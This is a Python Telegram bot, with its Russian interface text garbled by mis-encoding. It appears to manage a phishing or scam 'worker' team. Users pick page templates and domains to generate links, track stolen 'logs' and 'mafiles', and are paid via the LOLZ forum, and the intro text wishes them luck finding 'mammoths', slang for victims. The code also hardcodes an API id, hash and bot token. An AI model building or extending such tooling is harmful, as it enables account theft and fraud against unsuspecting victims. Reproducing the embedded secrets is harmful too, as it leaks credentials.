import pyromod
import asyncio
from pyrogram import *
from pyrogram.types import *
from pyrogram.handlers import MessageHandler
from pyromod.helpers import ikb
from datetime import datetime, timedelta
import lbot
import re

app = Client(
    "my_bot",
    api_id="26134369",
    api_hash="3f84867554e3fe0dc743b16c7fc7dde1",
    bot_token="5998901106:AAEOOYDXEP-bYaYc8PmRccE7uMw9oI48bBI"
)

user_states = {}

answer_worked_before = ikb([
    [('‚úî–†–∞–±–æ—Ç–∞–ª', '1'), ('‚ùå–ù–µ —Ä–∞–±–æ—Ç–∞–ª', '0')]#,
    #[('–ü–æ–¥–¥–µ—Ä–∂–∫–∞', 't.me/pyromodchat', 'url')]
])

info_text = """
üîé –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è:

üí¨ –ß–∞—Ç –≤–æ—Ä–∫–µ—Ä–æ–≤ - [–í—Å—Ç—É–ø–∏—Ç—å](https://t.me/+V_3Pm49AAKE4NGVi)
‚úÖ –ù–æ–≤–æ—Å—Ç–∏ –æ –∫–∞–Ω–∞–ª–µ - [–í—Å—Ç—É–ø–∏—Ç—å](https://t.me/+ncFdxlr44N9jYzAy)
‚è∞ –û—Ç—Å—Ç—É–∫ –æ –ª–æ–≥–∞—Ö/–º–∞—Ñ–∞—Ö - [–í—Å—Ç—É–ø–∏—Ç—å](https://t.me/+H3IranCAEosyYTky)
üíµ –í—ã–ø–ª–∞—Ç—ã –Ω–∞ LOLZ –≤–æ—Ä–∫–µ—Ä–∞–º - [–í—Å—Ç—É–ø–∏—Ç—å](https://t.me/+VB3nLVr8wk44ZmRi)

üì¨ –ú–∞–Ω—É–∞–ª—ã - –ü—Ä–æ—á–∏—Ç–∞—Ç—å

üòò–£–¥–∞—á–∏ –≤ –ø–æ–∏—Å–∫–∞—Ö –º–∞–º–æ–Ω—Ç–æ–≤!üòò
"""

# –°–æ–∑–¥–∞–µ–º –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É
default_keyboard = ReplyKeyboardMarkup(
    keyboard=[
        [
            KeyboardButton("üîé–ò–Ω—Ñ–æ"),
            KeyboardButton("üíº–ü—Ä–æ—Ñ–∏–ª—å"),
            KeyboardButton("üìé–°—Å—ã–ª–∫–∏")
        ],
        [
            KeyboardButton("üöë–ü–æ–¥–¥–µ—Ä–∂–∫–∞"),
            KeyboardButton("üìÉ–ü—Ä–∞–≤–∏–ª–∞")
            # KeyboardButton("–ù–∞—Å—Ç—Ä–æ–π–∫–∏ ‚öôÔ∏è")
        ]
    ],
    resize_keyboard=True
)

# –°–æ–∑–¥–∞–µ–º –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É
links_keyboard = ReplyKeyboardMarkup(
    keyboard=[
        [
            KeyboardButton("üîé–ú–æ–∏ —Å—Å—ã–ª–∫–∏"),
            KeyboardButton("üìé–°–æ–∑–¥–∞—Ç—å —Å—Å—ã–ª–∫—É")
        ],
        [
            KeyboardButton("üöë–ü–æ–¥–¥–µ—Ä–∂–∫–∞"),
            KeyboardButton("üìÉ–ü—Ä–∞–≤–∏–ª–∞"),
            KeyboardButton("/start")
        ]
    ],
    resize_keyboard=True
)

@app.on_message(filters.command("stop") & filters.private)
async def stop_proc(client, message):
    await app.send_message(message.chat.id, "–ü–æ–∫–∞( üò•")

@app.on_message(filters.command("start") & filters.private)
async def main_proc(client, message):
    # Question
    if await lbot.check_first_start(message.chat.id):
        if message.chat.id not in user_states:
            question_wk = "–î–ª—è –Ω–∞—á–∞–ª–∞ –æ—Ç–≤–µ—Ç–∏–º –Ω–∞ –≤–æ–ø—Ä–æ—Å—ã, —Ä–∞–±–æ—Ç–∞–ª–∏ –ª–∏ –≤—ã –∫–æ–≥–¥–∞-–Ω–∏–±—É–¥—å —Ä–∞–Ω—å—à–µ —Å —ç—Ç–∏–º?:"
            user_states[message.chat.id] = "waiting_answer"
            answer = await message.chat.ask(question_wk, message.chat.id, reply_markup=answer_worked_before)
            if user_states[message.chat.id] == "waiting_answer":
                del user_states[message.chat.id]
        else:
            await app.send_message(message.chat.id, "–í–æ—Ä–∫–∞–µ–º –ø—É–ø—Å–∏–∫!üíã", reply_markup=default_keyboard)
    else:
        await app.send_message(message.chat.id, "–í–æ—Ä–∫–∞–µ–º –ø—É–ø—Å–∏–∫!üíã", reply_markup=default_keyboard)

async def show_design(num, cht):
    datas = await lbot.get_design_list_names()
    dataid = await lbot.get_design_list_id()
    datalen = len(datas)
    num = await lbot.get_page_number(cht)
    # –°–æ–∑–¥–∞–µ–º –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É
    rpm = InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton("‚¨ÖÔ∏è –ü—Ä–µ–¥—ã–¥—É—â–∏–π", callback_data="design_previous"),
                InlineKeyboardButton("‚û°Ô∏è –°–ª–µ–¥—É—é—â–∏–π", callback_data=f"design_next_{datalen}")
            ],
            [
                InlineKeyboardButton("–í—ã–±—Ä–∞—Ç—å —à–∞–±–ª–æ–Ω", callback_data=f"design_select_{dataid[num]}")
                # InlineKeyboardButton("–ù–∞–∑–∞–¥", callback_data=f"back")
            ]
        ]
    )

    if datas:
        await app.send_message(cht, f"–ù–∞–∑–≤–∞–Ω–∏–µ —à–∞–±–ª–æ–Ω–∞: {datas[num]}, id: {dataid[num]}", reply_markup=rpm)
    else:
        await app.send_message(cht, "–û—à–∏–±–∫–∞ –≤ API!", reply_markup=rpm)

async def show_dom(num, cht, sp):
    datas = await lbot.get_domains_list_names()
    dataid = await lbot.get_domains_list_id()
    datalen = len(datas)
    num = await lbot.get_page_number_dom(cht)
    # –°–æ–∑–¥–∞–µ–º –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É
    keydom = InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton("‚¨ÖÔ∏è –ü—Ä–µ–¥—ã–¥—É—â–∏–π", callback_data="domain_previous"),
                InlineKeyboardButton("‚û°Ô∏è –°–ª–µ–¥—É—é—â–∏–π", callback_data=f"domain_next_{datalen}")
            ],
            [
                InlineKeyboardButton("–í—ã–±—Ä–∞—Ç—å —à–∞–±–ª–æ–Ω", callback_data=f"domain_select_{dataid[num]}_d_{sp}")
                # InlineKeyboardButton("–ù–∞–∑–∞–¥", callback_data=f"back")
            ]
        ]
    )

    if datas:
        await app.send_message(cht, f"–ù–∞–∑–≤–∞–Ω–∏–µ —à–∞–±–ª–æ–Ω–∞: {datas[num]}, id: {dataid[num]}", reply_markup=keydom)
    else:
        await app.send_message(cht, "–û—à–∏–±–∫–∞ –≤ API!")

@app.on_message(filters.private)
async def default_process(client, message):
    if message.text == "üíº–ü—Ä–æ—Ñ–∏–ª—å":
        user_data = await lbot.get_profile_data(message.chat.id)
        stats = await lbot.get_statistics_by_tg_id(message.chat.id)
        id, tg_id, join_date, first_start, url_lolz, worked_before, verified = user_data
        tg_id, balance, all_time_logs, mafiles = stats
        profile_message = f"""
üìå –ü—Ä–æ—Ñ–∏–ª—å: {message.chat.username}
‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ
üìú –õ–æ–≥–æ–≤: {all_time_logs}
üïµÔ∏è‚Äç‚ôÇÔ∏è –ú–∞—Ñ–æ–≤: {mafiles}
‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ
üí∞ –ë–∞–ª–∞–Ω—Å: {balance}‚ÇΩ
üìä –í—Å–µ–≥–æ –ª–æ–≥–æ–≤ –∑–∞ –≤—Å—ë –≤—Ä–µ–º—è: {all_time_logs}
‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ
üîó –°—Å—ã–ª–∫–∞ –Ω–∞ LOLZ: {url_lolz}
        """
        await app.send_message(message.chat.id, profile_message)
    
    if message.text == "üîé–ò–Ω—Ñ–æ":
        info_message = "üîç–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è:"
        await app.send_message(message.chat.id, info_text)
    
    if message.text == "üîé–ú–æ–∏ —Å—Å—ã–ª–∫–∏":
        links = await lbot.get_actual_links()
        if links:
            for domain_name, path_name, link_create_time in links:
                await app.send_message(message.chat.id, f"üìé–°—Å—ã–ª–∫–∞: {domain_name}/{path_name}\nüïë–î–∞—Ç–∞ —Å–æ–∑–¥–∞–Ω–∏—è:{link_create_time}", reply_markup=links_keyboard)
    
    
    if message.text == "üìé–°—Å—ã–ª–∫–∏":
        link_message = "**üìé–ú–æ–∏ —Å—Å—ã–ª–∫–∏**:"
        await app.send_message(message.chat.id, link_message, reply_markup=links_keyboard)
    
    if message.text == "üìé–°–æ–∑–¥–∞—Ç—å —Å—Å—ã–ª–∫—É":
        cht = message.chat.id
        link_message = "**üìé–°—Å—ã–ª–∫–∏**:"
        await lbot.set_page(cht, 0)
        await app.send_message(message.chat.id, link_message, reply_markup=links_keyboard)
        await show_design(await lbot.get_page_number(cht), cht)

@app.on_callback_query()
async def callback_handler(client, callback_query):
    button_data = callback_query.data
    # add proverka for callback by name
    if callback_query.from_user.id in user_states and user_states[callback_query.from_user.id] == "waiting_answer":
        # await callback_query.answer("–í—ã –Ω–∞–∂–∞–ª–∏ –∫–Ω–æ–ø–∫—É: " + button_data) # Only on DEBUG
        user_states[callback_query.from_user.id] = "answered"

        if callback_query.from_user.id in user_states and user_states[callback_query.from_user.id] == "answered":
            # await app.send_message(callback_query.from_user.id, "OK!") # Complete
            question_wk = "–°–∫–∏–Ω—å—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ –≤–∞—à –ø—Ä–æ—Ñ–∏–ª—å LOLZ:"
            user_states[callback_query.from_user.id] = "waiting_answer"
            answer_url = await callback_query.message.chat.ask(question_wk, callback_query.from_user.id)
            #print(await lbot.checklink(str(answer_url.text)))

            if str(await lbot.checklink(str(answer_url.text))) == "200":
                if await lbot.create_user(str(callback_query.from_user.id), "0", str(button_data), str(answer_url.text)):
                    await app.send_message(callback_query.from_user.id, "–í–∞—à–∞ –∑–∞—è–≤–∫–∞ –≤ —Å–∫–æ—Ä–æ–º –≤—Ä–µ–º–µ–Ω–∏ –±—É–¥–µ—Ç —Ä–∞–∑–≥–ª—è–Ω—É—Ç–∞, —Å–ø–∞—Å–∏–±–æ!", reply_markup=default_keyboard)
                else:
                    await app.send_message(callback_query.from_user.id, "–í–Ω—É—Ç—Ä–µ–Ω–Ω—è—è –æ—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ...")
            else:
                await app.send_message(callback_query.from_user.id, "–í–∞—à–∞ —Å—Å—ã–ª–∫–∞ –Ω–µ–¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–∞.")

            if user_states[callback_query.from_user.id] == "waiting_answer":
                del user_states[callback_query.from_user.id]

    if button_data == "domain_previous":
        await lbot.decrease_page(callback_query.from_user.id)
        await show_dom(await lbot.get_page_number(callback_query.from_user.id), callback_query.from_user.id)
        await callback_query.answer("Previous", show_alert=False)

    if "domain_next" in button_data:
        nump = int(button_data.replace("domain_next_", ""))
        await lbot.increase_page(callback_query.from_user.id, int(nump))
        await show_dom(await lbot.get_page_number(callback_query.from_user.id), callback_query.from_user.id)
        await callback_query.answer("Next", show_alert=False)

    if "domain_select" in button_data:
        mes = await app.send_message(callback_query.from_user.id, "–î–æ–º–µ–Ω –≤—ã–±—Ä–∞–Ω!")
        match = re.search(r"domain_select_(\d+)_d_(\d+)", button_data)
        if match:
            sel_id = button_data.replace("domain_select_", "")
            domain = match.group(1)
            design = match.group(2)
            # await app.send_message(callback_query.from_user.id, f"–í—ã –≤—ã–±—Ä–∞–ª–∏ {domain} id –∏ {design}")
            answer = await mes.chat.ask('*üìã–¢–µ–ø–µ—Ä—å –Ω–∞–ø–∏—à–∏ –∞–¥—Ä–µ—Å (üí°–ù–∞–ø—Ä–∏–º–µ—Ä: "662423523632"):*', parse_mode=enums.ParseMode.MARKDOWN)
            await answer.request.edit_text("–ê–¥—Ä–µ—Å –ø–æ–ª—É—á–µ–Ω!")
            await answer.reply(f'–°–æ–∑–¥–∞–Ω–∏–µ —Å—Å—ã–ª–∫–∏...', quote=True)
            if await lbot.create_link(design, domain, answer.text):
                await app.send_message(callback_query.from_user.id, "–°—Å—ã–ª–∫–∞ —Å–æ–∑–¥–∞–Ω–∞ —É—Å–ø–µ—à–Ω–æ, –∑–∞–π–¥–∏—Ç–µ –≤ '–ú–æ–∏ —Å—Å—ã–ª–∫–∏'!")
            else:
                await app.send_message(callback_query.from_user.id, "–û—à–∏–±–∫–∞ –≤ —Å–æ–∑–¥–∞–Ω–∏–∏ —Å—Å—ã–ª–∫–∏!")
            await callback_query.answer("Selected", show_alert=False)
        else:
            print("No match found.")

    if button_data == "design_previous":
        await lbot.decrease_page(callback_query.from_user.id)
        await show_design(await lbot.get_page_number(callback_query.from_user.id), callback_query.from_user.id)
        await callback_query.answer("Previous", show_alert=False)

    if "design_next" in button_data:
        nump = int(button_data.replace("design_next_", ""))
        await lbot.increase_page(callback_query.from_user.id, int(nump))
        await show_design(await lbot.get_page_number(callback_query.from_user.id), callback_query.from_user.id)
        await callback_query.answer("Next", show_alert=False)

    if "design_select" in button_data:
        sel_id = button_data.replace("design_select_", "")
        await callback_query.answer("Selected", show_alert=False)
        await app.send_message(callback_query.from_user.id, f"–í—ã –≤—ã–±—Ä–∞–ª–∏ {sel_id} id")
        await lbot.set_page_dom(callback_query.from_user.id, 0)
        await show_dom(await lbot.get_page_number_dom(callback_query.from_user.id), callback_query.from_user.id, sel_id)

    # if "back" in button_data:
    #     await start_c(client, callback_query)

# app.add_handler(MessageHandler(onMessage))

if __name__ == '__main__':
    lbot.create_users_table()
    lbot.create_database()
    lbot.create_statistics_table()

    app.run()